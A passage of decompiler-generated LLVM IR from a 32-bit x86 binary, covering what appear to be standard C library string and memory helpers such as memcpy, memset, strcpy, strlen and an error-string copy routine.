  %v5_804ce15 = call i32 @function_804f620(i32 %arg1, i32 %v5_804ce0c, i32 %v0_804ce0f, i32 %v10_804ce03)
  %v6_804ce15 = sext i32 %v5_804ce15 to i64
  %v10_804ce1c = udiv i64 %v6_804ce15, %arg2
  %v11_804ce1c = trunc i64 %v10_804ce1c to i32
  br label %dec_label_pc_804ce34

dec_label_pc_804ce23:                             ; preds = %dec_label_pc_804cdfe
  %v0_804ce23 = load i32, i32* @ebx, align 4
  %v1_804ce23 = inttoptr i32 %v0_804ce23 to i16*
  %v2_804ce23 = load i16, i16* %v1_804ce23, align 2
  %v3_804ce23 = or i16 %v2_804ce23, 8
  store i16 %v3_804ce23, i16* %v1_804ce23, align 2
  %v0_804ce27 = load i32, i32* %stack_var_-28, align 4
  %v1_804ce27 = call i32 @function_804b4bc(i32 %v0_804ce27)
  %v1_804ce2c = inttoptr i32 %v1_804ce27 to i32*
  store i32 22, i32* %v1_804ce2c, align 4
  br label %dec_label_pc_804ce32

dec_label_pc_804ce32:                             ; preds = %dec_label_pc_804cdfa, %dec_label_pc_804cdf6, %dec_label_pc_804cde2, %dec_label_pc_804ce23
  br label %dec_label_pc_804ce34

dec_label_pc_804ce34:                             ; preds = %dec_label_pc_804ce09, %dec_label_pc_804ce32
  %v0_804ce37 = phi i32 [ %v11_804ce1c, %dec_label_pc_804ce09 ], [ 0, %dec_label_pc_804ce32 ]
  store i32 %v0_804cdc5, i32* @esi, align 4
  store i32 %v0_804cdc4, i32* @edi, align 4
  ret i32 %v0_804ce37

; uselistorder directives
  uselistorder i32 %v0_804cde2, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_804f620, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 (i16*, i32, i32, i32)* @function_804f710, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ce34, { 1, 0 }
  uselistorder label %dec_label_pc_804ce32, { 3, 0, 1, 2 }
}

define i32 @function_804ce38(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804ce38:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804ce39 = load i32, i32* @esi, align 4
  store i32 %v0_804ce39, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804ce3a = sdiv i32 %sext, 16777216
  store i32 %v4_804ce3a, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804ce44 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804ce44, i32* %edi.global-to-local, align 4
  %v2_804ce48 = udiv i32 %v4_804ce3a, 4
  %v3_804ce4b = inttoptr i32 %arg2 to i8*
  %v4_804ce4b = bitcast i16* %arg1 to i8*
  %v5_804ce4b = call i8* @_memcpy(i8* %v4_804ce4b, i8* %v3_804ce4b, i32 %v2_804ce48)
  %v6_804ce4b = ptrtoint i8* %v5_804ce4b to i32
  store i32 %v6_804ce4b, i32* @ecx, align 4
  %v0_804ce4d = load i32, i32* %eax.global-to-local, align 4
  %v2_804ce4d = and i32 %v0_804ce4d, 2
  %v3_804ce4d = icmp eq i32 %v2_804ce4d, 0
  br i1 %v3_804ce4d, label %dec_label_pc_804ce53, label %dec_label_pc_804ce51

dec_label_pc_804ce51:                             ; preds = %dec_label_pc_804ce38
  %v0_804ce51 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ce51 = inttoptr i32 %v0_804ce51 to i16*
  %v2_804ce51 = load i16, i16* %v1_804ce51, align 2
  %v3_804ce51 = load i32, i32* %edi.global-to-local, align 4
  %v4_804ce51 = inttoptr i32 %v3_804ce51 to i16*
  store i16 %v2_804ce51, i16* %v4_804ce51, align 2
  %v5_804ce51 = load i32, i32* %edi.global-to-local, align 4
  %v6_804ce51 = load i32, i32* %esi.global-to-local, align 4
  %v7_804ce51 = load i1, i1* @df, align 1
  %v8_804ce51 = select i1 %v7_804ce51, i32 -2, i32 2
  %v9_804ce51 = add i32 %v8_804ce51, %v5_804ce51
  %v10_804ce51 = add i32 %v8_804ce51, %v6_804ce51
  store i32 %v9_804ce51, i32* %edi.global-to-local, align 4
  store i32 %v10_804ce51, i32* %esi.global-to-local, align 4
  %v0_804ce53.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ce53

dec_label_pc_804ce53:                             ; preds = %dec_label_pc_804ce38, %dec_label_pc_804ce51
  %v0_804ce53 = phi i32 [ %v0_804ce4d, %dec_label_pc_804ce38 ], [ %v0_804ce53.pre, %dec_label_pc_804ce51 ]
  %v2_804ce53 = urem i32 %v0_804ce53, 2
  %v3_804ce53 = icmp eq i32 %v2_804ce53, 0
  br i1 %v3_804ce53, label %dec_label_pc_804ce58, label %dec_label_pc_804ce57

dec_label_pc_804ce57:                             ; preds = %dec_label_pc_804ce53
  %v0_804ce57 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ce57 = inttoptr i32 %v0_804ce57 to i8*
  %v2_804ce57 = load i8, i8* %v1_804ce57, align 1
  %v3_804ce57 = load i32, i32* %edi.global-to-local, align 4
  %v4_804ce57 = inttoptr i32 %v3_804ce57 to i8*
  store i8 %v2_804ce57, i8* %v4_804ce57, align 1
  %v5_804ce57 = load i32, i32* %edi.global-to-local, align 4
  %v6_804ce57 = load i32, i32* %esi.global-to-local, align 4
  %v7_804ce57 = load i1, i1* @df, align 1
  %v8_804ce57 = select i1 %v7_804ce57, i32 -1, i32 1
  %v9_804ce57 = add i32 %v8_804ce57, %v5_804ce57
  %v10_804ce57 = add i32 %v8_804ce57, %v6_804ce57
  store i32 %v9_804ce57, i32* %edi.global-to-local, align 4
  store i32 %v10_804ce57, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ce58

dec_label_pc_804ce58:                             ; preds = %dec_label_pc_804ce53, %dec_label_pc_804ce57
  store i32 %v4_804ce44, i32* %eax.global-to-local, align 4
  %v2_804ce5c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ce5c, i32* @esi, align 4
  ret i32 %v4_804ce44

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %eax.global-to-local, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ce58, { 1, 0 }
  uselistorder label %dec_label_pc_804ce53, { 1, 0 }
}

define i32 @function_804ce60(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804ce60:
  %v0_804ce60 = load i32, i32* @edi, align 4
  %v4_804ce69 = ptrtoint i8* %arg1 to i32
  %v5_804ce6d = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_804ce6d = ptrtoint i8* %v5_804ce6d to i32
  store i32 %v6_804ce6d, i32* @ecx, align 4
  store i32 %v0_804ce60, i32* @edi, align 4
  ret i32 %v4_804ce69

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_804ce78(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804ce78:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804ce79 = load i32, i32* @esi, align 4
  store i32 %v0_804ce79, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804ce81 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ce81, i32* %edi.global-to-local, align 4
  %v4_804ce85.pre = load i32, i32* @eax, align 4
  %v8_804ce85.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804ce85

dec_label_pc_804ce85:                             ; preds = %dec_label_pc_804ce85.dec_label_pc_804ce85_crit_edge, %dec_label_pc_804ce78
  %v2_804ce86 = phi i32 [ %v7_804ce86, %dec_label_pc_804ce85.dec_label_pc_804ce85_crit_edge ], [ %v4_804ce81, %dec_label_pc_804ce78 ]
  %v8_804ce85 = phi i1 [ %v5_804ce86, %dec_label_pc_804ce85.dec_label_pc_804ce85_crit_edge ], [ %v8_804ce85.pre, %dec_label_pc_804ce78 ]
  %v4_804ce85 = phi i32 [ %v0_804ce87, %dec_label_pc_804ce85.dec_label_pc_804ce85_crit_edge ], [ %v4_804ce85.pre, %dec_label_pc_804ce78 ]
  %v7_804ce85 = phi i32 [ %v0_804ce85.pre, %dec_label_pc_804ce85.dec_label_pc_804ce85_crit_edge ], [ %arg2, %dec_label_pc_804ce78 ]
  %v1_804ce85 = inttoptr i32 %v7_804ce85 to i8*
  %v2_804ce85 = load i8, i8* %v1_804ce85, align 1
  %v3_804ce85 = zext i8 %v2_804ce85 to i32
  %v5_804ce85 = and i32 %v4_804ce85, -256
  %v6_804ce85 = or i32 %v3_804ce85, %v5_804ce85
  store i32 %v6_804ce85, i32* %eax.global-to-local, align 4
  %v9_804ce85 = select i1 %v8_804ce85, i32 -1, i32 1
  %v10_804ce85 = add i32 %v7_804ce85, %v9_804ce85
  store i32 %v10_804ce85, i32* %esi.global-to-local, align 4
  %v3_804ce86 = inttoptr i32 %v2_804ce86 to i8*
  store i8 %v2_804ce85, i8* %v3_804ce86, align 1
  %v4_804ce86 = load i32, i32* %edi.global-to-local, align 4
  %v5_804ce86 = load i1, i1* @df, align 1
  %v6_804ce86 = select i1 %v5_804ce86, i32 -1, i32 1
  %v7_804ce86 = add i32 %v6_804ce86, %v4_804ce86
  store i32 %v7_804ce86, i32* %edi.global-to-local, align 4
  %v0_804ce87 = load i32, i32* %eax.global-to-local, align 4
  %v3_804ce87 = trunc i32 %v0_804ce87 to i8
  %v4_804ce87 = icmp eq i8 %v3_804ce87, 0
  %v1_804ce89 = icmp eq i1 %v4_804ce87, false
  br i1 %v1_804ce89, label %dec_label_pc_804ce85.dec_label_pc_804ce85_crit_edge, label %dec_label_pc_804ce8b

dec_label_pc_804ce85.dec_label_pc_804ce85_crit_edge: ; preds = %dec_label_pc_804ce85
  %v0_804ce85.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ce85

dec_label_pc_804ce8b:                             ; preds = %dec_label_pc_804ce85
  store i32 %v4_804ce81, i32* %eax.global-to-local, align 4
  %v2_804ce90 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ce90, i32* @esi, align 4
  ret i32 %v4_804ce81

; uselistorder directives
  uselistorder i32 %v0_804ce87, { 1, 0 }
  uselistorder i32 %v7_804ce86, { 1, 0 }
  uselistorder i1 %v5_804ce86, { 1, 0 }
  uselistorder i32 %v4_804ce81, { 1, 2, 0, 3 }
}

define i32 @function_804ce94(i8* %arg1) local_unnamed_addr {
dec_label_pc_804ce94:
  %v0_804ce94 = load i32, i32* @edi, align 4
  %v3_804ce9e = call i32 @_strlen(i8* %arg1)
  store i32 %v3_804ce9e, i32* @ecx, align 4
  store i32 %v0_804ce94, i32* @edi, align 4
  ret i32 %v3_804ce9e
}

define i32 @function_804cea8(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804cea8:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804cea9 = load i32, i32* @esi, align 4
  store i32 %v0_804cea9, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804ceb5 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ceb5, i32* %edi.global-to-local, align 4
  %v1_804ceb9 = add i32 %arg3, 1
  store i32 %v1_804ceb9, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ceba

dec_label_pc_804ceba:                             ; preds = %dec_label_pc_804cebd, %dec_label_pc_804cea8
  %v3_804cebe = phi i32 [ %v4_804ceb5, %dec_label_pc_804cea8 ], [ %v8_804cebe, %dec_label_pc_804cebd ]
  %v0_804ceba = phi i32 [ %v1_804ceb9, %dec_label_pc_804cea8 ], [ %v0_804ceba.pre, %dec_label_pc_804cebd ]
  %v1_804ceba = add i32 %v0_804ceba, -1
  %v8_804ceba = icmp eq i32 %v1_804ceba, 0
  store i32 %v1_804ceba, i32* %ecx.global-to-local, align 4
  br i1 %v8_804ceba, label %.loopexit, label %dec_label_pc_804cebd

dec_label_pc_804cebd:                             ; preds = %dec_label_pc_804ceba
  %v0_804cebd = load i32, i32* %esi.global-to-local, align 4
  %v1_804cebd = inttoptr i32 %v0_804cebd to i8*
  %v2_804cebd = load i8, i8* %v1_804cebd, align 1
  %v10_804cebd = load i1, i1* @df, align 1
  %v11_804cebd = select i1 %v10_804cebd, i32 -1, i32 1
  %v12_804cebd = add i32 %v11_804cebd, %v0_804cebd
  store i32 %v12_804cebd, i32* %esi.global-to-local, align 4
  %v4_804cebe = inttoptr i32 %v3_804cebe to i8*
  store i8 %v2_804cebd, i8* %v4_804cebe, align 1
  %v5_804cebe = load i32, i32* %edi.global-to-local, align 4
  %v6_804cebe = load i1, i1* @df, align 1
  %v7_804cebe = select i1 %v6_804cebe, i32 -1, i32 1
  %v8_804cebe = add i32 %v7_804cebe, %v5_804cebe
  store i32 %v8_804cebe, i32* %edi.global-to-local, align 4
  %v6_804cebf = icmp eq i8 %v2_804cebd, 0
  %v1_804cec1 = icmp eq i1 %v6_804cebf, false
  %v0_804ceba.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_804cec1, label %dec_label_pc_804ceba, label %dec_label_pc_804cec3

dec_label_pc_804cec3:                             ; preds = %dec_label_pc_804cebd
  %v1_804cec3 = add i32 %v0_804ceba.pre, -1
  store i32 %v1_804cec3, i32* %ecx.global-to-local, align 4
  %v2_804cec4 = sext i8 %v2_804cebd to i32
  %v4_804cec4 = inttoptr i32 %v8_804cebe to i8*
  %v5_804cec4 = call i8* @_memset(i8* %v4_804cec4, i32 %v2_804cec4, i32 %v1_804cec3)
  %v6_804cec4 = ptrtoint i8* %v5_804cec4 to i32
  store i32 %v6_804cec4, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804ceba, %dec_label_pc_804cec3
  %v2_804ceca = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ceca, i32* @edx, align 4
  %v2_804cecb = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804cecb, i32* @esi, align 4
  ret i32 %v4_804ceb5

; uselistorder directives
  uselistorder i32 %v8_804cebe, { 0, 2, 1 }
  uselistorder i8 %v2_804cebd, { 0, 2, 1 }
  uselistorder i32 %v1_804ceba, { 1, 0 }
  uselistorder i32 %v4_804ceb5, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @function_804ced0() local_unnamed_addr {
dec_label_pc_804ced0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_1()
  %v4_804ced0 = ptrtoint i8* %tmp4 to i32
  %v8_804cee35 = icmp eq i32 %tmp, 0
  %v1_804cee46 = icmp eq i1 %v8_804cee35, false
  br i1 %v1_804cee46, label %dec_label_pc_804cedd, label %dec_label_pc_804cee6

dec_label_pc_804cedd:                             ; preds = %dec_label_pc_804ced0, %dec_label_pc_804cee2
  %v1_804cee38 = phi i32 [ %v1_804cee3, %dec_label_pc_804cee2 ], [ %tmp, %dec_label_pc_804ced0 ]
  %v0_804cee67 = phi i32 [ %v1_804cee2, %dec_label_pc_804cee2 ], [ %v4_804ced0, %dec_label_pc_804ced0 ]
  %v1_804cedd = inttoptr i32 %v0_804cee67 to i8*
  %v2_804cedd = load i8, i8* %v1_804cedd, align 1
  %v3_804cedd = icmp eq i8 %v2_804cedd, 0
  br i1 %v3_804cedd, label %dec_label_pc_804cee6, label %dec_label_pc_804cee2

dec_label_pc_804cee2:                             ; preds = %dec_label_pc_804cedd
  %v1_804cee2 = add i32 %v0_804cee67, 1
  %v1_804cee3 = add i32 %v1_804cee38, -1
  %v8_804cee3 = icmp eq i32 %v1_804cee3, 0
  %v1_804cee4 = icmp eq i1 %v8_804cee3, false
  br i1 %v1_804cee4, label %dec_label_pc_804cedd, label %dec_label_pc_804cee6

dec_label_pc_804cee6:                             ; preds = %dec_label_pc_804cee2, %dec_label_pc_804cedd, %dec_label_pc_804ced0
  %v0_804cee6.lcssa = phi i32 [ %v4_804ced0, %dec_label_pc_804ced0 ], [ %v0_804cee67, %dec_label_pc_804cedd ], [ %v1_804cee2, %dec_label_pc_804cee2 ]
  %v2_804cee6 = sub i32 %v0_804cee6.lcssa, %v4_804ced0
  ret i32 %v2_804cee6

; uselistorder directives
  uselistorder i32 %v1_804cee3, { 1, 0 }
  uselistorder i32 %v0_804cee67, { 0, 2, 1 }
  uselistorder i32 %v4_804ced0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cedd, { 1, 0 }
}

define i32 @function_804ceec() local_unnamed_addr {
dec_label_pc_804ceec:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_804cefd = call i32 @function_804cf0c(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_804cf02 = load i32, i32* @ebx, align 4
  ret i32 %v0_804cf02
}

define i32 @function_804cf0c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804cf0c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_804cf1e = icmp ugt i32 %arg1, 124
  br i1 %v6_804cf1e, label %dec_label_pc_804cf3b, label %dec_label_pc_804cf20

dec_label_pc_804cf20:                             ; preds = %dec_label_pc_804cf0c
  store i32 ptrtoint ([8 x i8]* @global_var_80530e0.131 to i32), i32* @esi, align 4
  %v1_804cf304 = icmp eq i32 %arg1, 0
  %v1_804cf3211 = icmp eq i1 %v1_804cf304, false
  br i1 %v1_804cf3211, label %dec_label_pc_804cf29, label %dec_label_pc_804cf34

dec_label_pc_804cf29:                             ; preds = %dec_label_pc_804cf20, %dec_label_pc_804cf29
  %v0_804cf2c = phi i32 [ %v3_804cf2c, %dec_label_pc_804cf29 ], [ %arg1, %dec_label_pc_804cf20 ]
  %v0_804cf2f = phi i32 [ %v1_804cf2f, %dec_label_pc_804cf29 ], [ ptrtoint ([8 x i8]* @global_var_80530e0.131 to i32), %dec_label_pc_804cf20 ]
  %v1_804cf29 = inttoptr i32 %v0_804cf2f to i8*
  %v2_804cf29 = load i8, i8* %v1_804cf29, align 1
  %v7_804cf29 = icmp eq i8 %v2_804cf29, 0
  %v2_804cf2c = zext i1 %v7_804cf29 to i32
  %v3_804cf2c = add i32 %v2_804cf2c, %v0_804cf2c
  %v16_804cf2c = icmp eq i32 %v3_804cf2c, 0
  %v1_804cf2f = add i32 %v0_804cf2f, 1
  store i32 %v1_804cf2f, i32* @esi, align 4
  %v1_804cf32 = icmp eq i1 %v16_804cf2c, false
  br i1 %v1_804cf32, label %dec_label_pc_804cf29, label %dec_label_pc_804cf34

dec_label_pc_804cf34:                             ; preds = %dec_label_pc_804cf29, %dec_label_pc_804cf20
  %v0_804cf36 = phi i32 [ ptrtoint ([8 x i8]* @global_var_80530e0.131 to i32), %dec_label_pc_804cf20 ], [ %v1_804cf2f, %dec_label_pc_804cf29 ]
  store i32 0, i32* @ebp, align 4
  %v1_804cf36 = inttoptr i32 %v0_804cf36 to i8*
  %v2_804cf36 = load i8, i8* %v1_804cf36, align 1
  %v3_804cf36 = icmp eq i8 %v2_804cf36, 0
  %v1_804cf39 = icmp eq i1 %v3_804cf36, false
  br i1 %v1_804cf39, label %dec_label_pc_804cf34.dec_label_pc_804cf6a_crit_edge, label %dec_label_pc_804cf3b

dec_label_pc_804cf34.dec_label_pc_804cf6a_crit_edge: ; preds = %dec_label_pc_804cf34
  br label %dec_label_pc_804cf6a

dec_label_pc_804cf3b:                             ; preds = %dec_label_pc_804cf34, %dec_label_pc_804cf0c
  store i32 22, i32* @ebp, align 4
  %v1_804cf43 = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  %v6_804cf4f = bitcast i32* %stack_var_-17 to i8*
  %v7_804cf4f = call i32 @function_804f848(i8* %v6_804cf4f, i32 %arg1, i32 %v1_804cf43, i32 -10, i32 0)
  %v1_804cf57 = add i32 %v7_804cf4f, -14
  store i32 %v1_804cf57, i32* @esi, align 4
  %v5_804cf61 = inttoptr i32 %v1_804cf57 to i8*
  store i8* %v5_804cf61, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_804cf57 to i16*
  %v6_804cf62 = call i32 @function_804ce38(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_80530c2.132 to i32), i32 14)
  %v0_804cf79.pre = load i32, i32* @edi, align 4
  %v0_804cf7b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cf6a

dec_label_pc_804cf6a:                             ; preds = %dec_label_pc_804cf34.dec_label_pc_804cf6a_crit_edge, %dec_label_pc_804cf3b
  %v0_804cf7b = phi i32 [ %v0_804cf36, %dec_label_pc_804cf34.dec_label_pc_804cf6a_crit_edge ], [ %v0_804cf7b.pre, %dec_label_pc_804cf3b ]
  %v0_804cf79 = phi i32 [ %arg3, %dec_label_pc_804cf34.dec_label_pc_804cf6a_crit_edge ], [ %v0_804cf79.pre, %dec_label_pc_804cf3b ]
  %v4_804cf6c = icmp eq i32 %arg2, 0
  %v1_804cf71 = icmp eq i1 %v4_804cf6c, false
  %v2_804cf79 = select i1 %v1_804cf71, i32 %v0_804cf79, i32 0
  store i32 %v2_804cf79, i32* @edi, align 4
  %v5_804cf7b = inttoptr i32 %v0_804cf7b to i8*
  store i8* %v5_804cf7b, i8** %stack_var_-108, align 4
  %v3_804cf7c = call i32 @function_804ce94(i8* %v5_804cf7b)
  %v1_804cf84 = add i32 %v3_804cf7c, 1
  store i32 %v1_804cf84, i32* %ebx.global-to-local, align 4
  %v1_804cf87 = load i32, i32* @edi, align 4
  %tmp46 = icmp ugt i32 %v1_804cf84, %v1_804cf87
  br i1 %tmp46, label %dec_label_pc_804cf8b, label %dec_label_pc_804cf92

dec_label_pc_804cf8b:                             ; preds = %dec_label_pc_804cf6a
  store i32 %v1_804cf87, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_804cf92

dec_label_pc_804cf92:                             ; preds = %dec_label_pc_804cf6a, %dec_label_pc_804cf8b
  %v0_804cf97 = phi i32 [ %v1_804cf84, %dec_label_pc_804cf6a ], [ %v1_804cf87, %dec_label_pc_804cf8b ]
  %v1_804cf92 = icmp eq i32 %v0_804cf97, 0
  br i1 %v1_804cf92, label %dec_label_pc_804cfae, label %dec_label_pc_804cf96

dec_label_pc_804cf96:                             ; preds = %dec_label_pc_804cf92
  %v0_804cf98 = load i32, i32* @esi, align 4
  %v8_804cf99 = inttoptr i32 %arg2 to i8*
  store i8* %v8_804cf99, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_804cf9d = call i32 @function_804ce38(i16* %tmp45, i32 %v0_804cf98, i32 %v0_804cf97)
  %v1_804cfa9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cfa9 = add i32 %arg2, -1
  %v3_804cfa9 = add i32 %v2_804cfa9, %v1_804cfa9
  %v4_804cfa9 = inttoptr i32 %v3_804cfa9 to i8*
  store i8 0, i8* %v4_804cfa9, align 1
  br label %dec_label_pc_804cfae

dec_label_pc_804cfae:                             ; preds = %dec_label_pc_804cf92, %dec_label_pc_804cf96
  %v0_804cfae = load i32, i32* @ebp, align 4
  %v1_804cfae = icmp eq i32 %v0_804cfae, 0
  br i1 %v1_804cfae, label %dec_label_pc_804cfb9, label %dec_label_pc_804cfb2

dec_label_pc_804cfb2:                             ; preds = %dec_label_pc_804cfae
  %v0_804cfb2 = load i8*, i8** %stack_var_-108, align 4
  %v1_804cfb2 = ptrtoint i8* %v0_804cfb2 to i32
  %v2_804cfb2 = call i32 @function_804b4bc(i32 %v1_804cfb2)
  %v0_804cfb7 = load i32, i32* @ebp, align 4
  %v2_804cfb7 = inttoptr i32 %v2_804cfb2 to i32*
  store i32 %v0_804cfb7, i32* %v2_804cfb7, align 4
  %v0_804cfbc.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804cfb9

dec_label_pc_804cfb9:                             ; preds = %dec_label_pc_804cfae, %dec_label_pc_804cfb2
  %v0_804cfbc = phi i32 [ 0, %dec_label_pc_804cfae ], [ %v0_804cfbc.pre, %dec_label_pc_804cfb2 ]
  ret i32 %v0_804cfbc

; uselistorder directives
  uselistorder i32 %v1_804cf87, { 1, 2, 0 }
  uselistorder i32 %v1_804cf84, { 1, 0, 2 }
  uselistorder i32 %v1_804cf57, { 1, 0, 2 }
  uselistorder i32 %v1_804cf2f, { 0, 2, 1 }
  uselistorder i32 %v3_804cf2c, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_80530e0.131 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804cfb9, { 1, 0 }
  uselistorder label %dec_label_pc_804cfae, { 1, 0 }
  uselistorder label %dec_label_pc_804cf92, { 1, 0 }
  uselistorder label %dec_label_pc_804cf6a, { 1, 0 }
  uselistorder label %dec_label_pc_804cf29, { 1, 0 }
}

define i32 @function_804cfc4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804cfc4:
  %v2_804cfd4 = inttoptr i32 %arg2 to i8*
  %v3_804cfd4 = call i32 @function_804ffe0(i8* %v2_804cfd4, i32 %arg1)
  ret i32 %v3_804cfd4
}

define i32 @function_804cfdc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804cfdc:
  %v4_804cfde = ptrtoint i8* %arg1 to i32
  store i32 %v4_804cfde, i32* @ecx, align 4
  %v0_804cfe8 = load i32, i32* bitcast (i32** @global_var_80559e8.133 to i32*), align 8
  br label %dec_label_pc_804cfee

dec_label_pc_804cfee:                             ; preds = %dec_label_pc_804d00b, %dec_label_pc_804cfdc
  %v0_804d0117 = phi i32 [ %v0_804d0118, %dec_label_pc_804d00b ], [ 0, %dec_label_pc_804cfdc ]
  %v0_804d00b = phi i32 [ %v1_804d00b, %dec_label_pc_804d00b ], [ %arg2, %dec_label_pc_804cfdc ]
  %v0_804d00c = phi i32 [ %v1_804d00c, %dec_label_pc_804d00b ], [ %v4_804cfde, %dec_label_pc_804cfdc ]
  %v12_804cfee = icmp eq i32 %v0_804d00c, %v0_804d00b
  %.pre = inttoptr i32 %v0_804d00c to i8*
  br i1 %v12_804cfee, label %dec_label_pc_804d006, label %dec_label_pc_804cff2

dec_label_pc_804cff2:                             ; preds = %dec_label_pc_804cfee
  %v2_804cff2 = load i8, i8* %.pre, align 1
  %v3_804cff2 = zext i8 %v2_804cff2 to i32
  %v2_804cff5 = mul nuw nsw i32 %v3_804cff2, 2
  %v3_804cff5 = add i32 %v2_804cff5, %v0_804cfe8
  %v4_804cff5 = inttoptr i32 %v3_804cff5 to i16*
  %v5_804cff5 = load i16, i16* %v4_804cff5, align 2
  %v6_804cff5 = sext i16 %v5_804cff5 to i32
  %v1_804cff9 = inttoptr i32 %v0_804d00b to i8*
  %v2_804cff9 = load i8, i8* %v1_804cff9, align 1
  %v3_804cff9 = zext i8 %v2_804cff9 to i32
  %v2_804cffc = mul nuw nsw i32 %v3_804cff9, 2
  %v3_804cffc = add i32 %v2_804cffc, %v0_804cfe8
  %v4_804cffc = inttoptr i32 %v3_804cffc to i16*
  %v5_804cffc = load i16, i16* %v4_804cffc, align 2
  %v6_804cffc = sext i16 %v5_804cffc to i32
  %v2_804d000 = sub nsw i32 %v6_804cff5, %v6_804cffc
  %v12_804d000 = icmp eq i32 %v2_804d000, 0
  store i32 %v2_804d000, i32* @edx, align 4
  %v1_804d004 = icmp eq i1 %v12_804d000, false
  br i1 %v1_804d004, label %dec_label_pc_804d00f, label %dec_label_pc_804d006

dec_label_pc_804d006:                             ; preds = %dec_label_pc_804cfee, %dec_label_pc_804cff2
  %v0_804d0118 = phi i32 [ %v2_804d000, %dec_label_pc_804cff2 ], [ %v0_804d0117, %dec_label_pc_804cfee ]
  %v2_804d006 = load i8, i8* %.pre, align 1
  %v3_804d006 = icmp eq i8 %v2_804d006, 0
  br i1 %v3_804d006, label %dec_label_pc_804d00f, label %dec_label_pc_804d00b

dec_label_pc_804d00b:                             ; preds = %dec_label_pc_804d006
  %v1_804d00b = add i32 %v0_804d00b, 1
  %v1_804d00c = add i32 %v0_804d00c, 1
  store i32 %v1_804d00c, i32* @ecx, align 4
  br label %dec_label_pc_804cfee

dec_label_pc_804d00f:                             ; preds = %dec_label_pc_804d006, %dec_label_pc_804cff2
  %v0_804d011 = phi i32 [ %v0_804d0118, %dec_label_pc_804d006 ], [ %v2_804d000, %dec_label_pc_804cff2 ]
  ret i32 %v0_804d011

; uselistorder directives
  uselistorder i32 %v1_804d00c, { 1, 0 }
